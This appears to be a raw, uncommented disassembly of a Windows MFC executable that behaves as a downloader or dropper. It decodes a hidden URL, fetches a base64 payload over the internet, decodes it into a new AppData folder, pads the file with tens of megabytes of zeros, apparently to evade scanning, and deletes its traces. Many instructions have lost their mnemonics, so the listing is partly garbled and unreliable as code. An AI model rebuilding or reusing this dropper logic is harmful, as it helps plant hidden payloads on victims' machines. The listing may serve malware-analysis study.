sub_4010b0
push ebp
mov ebp esp
push 0xffffffff
push sub_401b20
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x7d33c
call sub_4018f0
push ebx
push esi
mov ebx ecx
push edi
mov ecx 0xb
mov esi rw-data
lea edi [ ebp - 0x4c ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x3f
lea edi [ ebp - 0x24b ]
mov [ ebp - 0x24c ] 0x0
mov [ ebp - 0x10 ] esp
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x4c ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_401480
add esp 0x8
lea edx [ ebp - 0x24c ]
push edx
call [ DeleteUrlCacheEntry@IAT ]
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x34b ]
mov [ ebp - 0x34c ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x34c ]
push eax
call sub_401550
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x14b ]
mov [ ebp - 0x14c ] 0x0
[ edi ]
add esp 0x4
lea ecx [ ebp - 0x14c ]
stosw [ edi ]
push ecx
push 0xff
stosb [ edi ]
call [ GetTempPathA@IAT ]
mov cl [ ebp + eax - 0x14d ]
lea edx [ ebp - 0x14c ]
cmp cl 0x5c
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x14c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebp - 0x24c ]
push ecx
mov ecx ebx
call sub_401360
test eax eax
je r-xdata
mov edi rw-data
lea eax [ ebp - 0x14c ]
push eax
call [ DeleteFileA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x14c ]
push rw-data
push edx
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2
push 0x0
push ebx
call [ fseek@IAT ]
push ebx
call [ ftell@IAT ]
mov esi eax
mov [ ebp - 0x18 ] 0x0
push esi
call Ordinal_MFC42_823
mov ecx esi
mov edi eax
mov edx ecx
xor eax eax
shr ecx 0x2
mov [ ebp - 0x14 ] edi
add esp 0x14
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
call Ordinal_MFC42_823
mov ecx esi
mov edi eax
mov edx ecx
xor eax eax
shr ecx 0x2
mov [ ebp - 0x1c ] edi
add esp 0x4
[ edi ]
mov ecx edx
push 0x0
and ecx 0x3
push 0x0
[ edi ]
push ebx
call [ fseek@IAT ]
mov edi [ ebp - 0x14 ]
push ebx
push esi
push 0x1
push edi
call [ fread@IAT ]
push ebx
call [ fclose@IAT ]
mov ebx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
push eax
push ebx
push esi
push edi
call sub_401700
add esp 0x30
test eax eax
je r-xdata
push edi
call Ordinal_MFC42_825
add esp 0x4
push ebx
call Ordinal_MFC42_825
add esp 0x4
lea ecx [ ebp - 0x34c ]
push rw-data
push ecx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov edx [ ebp - 0x18 ]
push esi
push edx
push 0x1
push ebx
call [ fwrite@IAT ]
add esp 0x10
xor ebx ebx
mov ecx 0x1f3ff
xor eax eax
lea edi [ ebp - 0x7d34b ]
mov [ ebp - 0x7d34c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ fclose@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call Ordinal_MFC42_825
mov edx [ ebp - 0x1c ]
add esp 0x8
push edx
call Ordinal_MFC42_825
add esp 0x4
push 0x7d000
lea eax [ ebp - 0x7d34c ]
push 0x1
push eax
call [ fwrite@IAT ]
add esp 0x10
inc ebx
jmp r-xdata
cmp ebx 0x64
push esi
jge r-xdata
sub_401360
sub esp 0x10c
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x1d ]
mov [ esp + 0x1c ] bl
xor esi esi
[ edi ]
push esi
push esi
stosw [ edi ]
push esi
push esi
push rw-data
or ebp 0xffffffff
stosb [ edi ]
mov [ esp + 0x28 ] esi
call [ InternetOpenA@IAT ]
mov edi eax
cmp edi esi
mov [ esp + 0x10 ] edi
je r-xdata
push ebp
call [ CloseHandle@IAT ]
push edi
mov edi [ InternetCloseHandle@IAT ]
call edi
push ebx
call edi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn 0x8
mov eax [ esp + 0x120 ]
push esi
push 0x84000000
push esi
push esi
push eax
push edi
call [ InternetOpenUrlA@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov ecx [ esp + 0x124 ]
push esi
push 0x80
push 0x2
push esi
push esi
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
mov esi [ InternetReadFile@IAT ]
mov edi [ WriteFile@IAT ]
mov esi 0x1
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
lea edx [ esp + 0x24 ]
push 0x100
push edx
push ebp
call edi
test eax eax
jne r-xdata
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push edx
push 0x100
push eax
push ebx
call esi
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov edi [ esp + 0x10 ]
sub_401480
mov edx [ esp + 0x4 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
cmp ecx 0x100
jg r-xdata
retn
test ecx ecx
jle r-xdata
mov eax [ esp + 0x8 ]
push esi
sub edx eax
mov esi ecx
mov cl [ edx + eax ]
add cl 0x5
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
pop esi
sub_4014c0
sub esp 0x100
push ebx
mov ebx [ esp + 0x108 ]
push esi
push edi
push ebx
push 0x0
push 0x0
push 0x1a
push 0x0
call [ SHGetFolderPathA@IAT ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0xc ]
push eax
push rw-data
call sub_401480
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x100
retn
sub_401550
sub esp 0x200
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x110 ]
push eax
call sub_4014c0
lea edi [ esp + 0x114 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x218 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x14 ] al
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x3f
lea edi [ esp + 0x15 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x14 ]
push eax
push rw-data
call sub_401480
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov ebx [ CreateDirectoryA@IAT ]
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
push ebp
[ edi ] [ esi ]
call ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
lea eax [ esp + 0x10 ]
push eax
push rw-data
call sub_401480
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
push ebp
[ edi ] [ esi ]
call ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
lea eax [ esp + 0x10 ]
push eax
push rw-data
call sub_401480
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
sub_4016b0
mov eax [ esp + 0x4 ]
cmp eax 0x41
jb r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
cmp eax 0x30
jb r-xdata
cmp eax 0x7a
ja r-xdata
add eax 0xffffffbf
retn
cmp eax 0x2b
jne r-xdata
cmp eax 0x39
ja r-xdata
add eax 0xffffffb9
retn
sub eax 0x2f
neg eax
sbb eax eax
and al 0xc0
add eax 0x3f
retn
mov eax 0x3e
retn
add eax 0x4
retn
sub_401700
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
add eax ebx
cmp ebx eax
mov [ esp + 0xc ] eax
jae r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
pop ebx
mov [ ecx ] eax
mov eax 0x1
retn
push ebp
push esi
push edi
mov eax edi
mov ecx 0x18
cdq
and edx 0x7
sub ecx edi
add eax edx
sar eax 0x3
shl esi cl
test eax eax
jle r-xdata
movsx ecx [ ebx ]
push ecx
call sub_4016b0
add esp 0x4
inc ebx
cmp eax 0xffffffff
jne r-xdata
cmp ebx [ esp + 0x18 ]
jb r-xdata
add [ esp + 0x14 ] eax
shl esi 0x6
or esi eax
add edi 0x6
dec ebp
jmp r-xdata
xor esi esi
xor edi edi
xor ebp ebp
pop edi
pop esi
pop ebp
mov edi [ esp + 0x1c ]
mov edx esi
shr edx 0x10
mov [ edi ] dl
shl esi 0x8
inc edi
dec eax
mov [ esp + 0x1c ] edi
jne r-xdata
cmp ebx [ esp + 0x18 ]
jae r-xdata
inc ebp
cmp ebp 0x4
jl r-xdata
sub_4018f0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401aa5
cmp [ rw-data ] ebx
jne r-xdata
call sub_401a90
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401aa2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401ab2
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401aca
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_401010
mov eax r--data
retn
sub_401020
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401040
push esi
mov esi ecx
call sub_401060
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401060
jmp Ordinal_MFC42_815
sub_401070
call sub_401080
jmp sub_401090
sub_401080
mov ecx rw-data
jmp sub_401020
sub_401090
push sub_4010a0
call sub_4018d6
pop ecx
retn
sub_4010a0
mov ecx rw-data
jmp sub_401060
sub_401357
mov eax r-xdata
retn
sub_401460
retn
sub_401470
retn 0x4
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
sub_4018aa
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4018d6
push [ esp + 0x4 ]
call sub_4018aa
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401a90
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401aa2
xor eax eax
retn
sub_401aa5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_401ab2
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_401af8
jmp sub_401af8
sub_401af8
push 0x600
push 0x0
call sub_401aca
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_401b20
mov eax r--data
jmp __CxxFrameHandler
